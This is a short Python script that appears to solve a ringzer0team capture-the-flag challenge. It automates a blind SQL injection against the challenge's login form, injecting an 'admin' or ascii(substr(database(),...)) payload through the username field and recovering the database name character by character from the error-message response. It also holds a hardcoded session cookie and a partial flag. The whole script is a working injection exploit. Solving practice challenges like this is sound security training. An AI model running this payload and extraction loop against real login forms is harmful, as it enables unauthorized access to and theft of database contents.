# -*- coding:utf-8 -*-
import requests
import urllib
import string

url = "https://ringzer0team.com/challenges/5"

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
    }
cookie = {"_ga": "GA1.2.1199078759.1526448138", "_gid": "GA1.2.1684881925.1526448138", "PHPSESSID": "8bora736cg7rmv4mlldsdr22n6", "_gat": "1"}

flag = '1b2f190ad705d7c2afc'

for pos in range(20, 100):
    print pos
    for ch in string.printable:
        payload = "ascii(substr((database()),{},1))^{}".format(str(pos), ord(ch))
        data = {"username": "admin' or ({}) #".format(payload), "password": "1"}

        res = requests.post(url, data=data, headers=headers, cookies=cookie)
        # print res.content
        if "Wrong username / password." in res.content:
            flag += ch
            print flag
            break
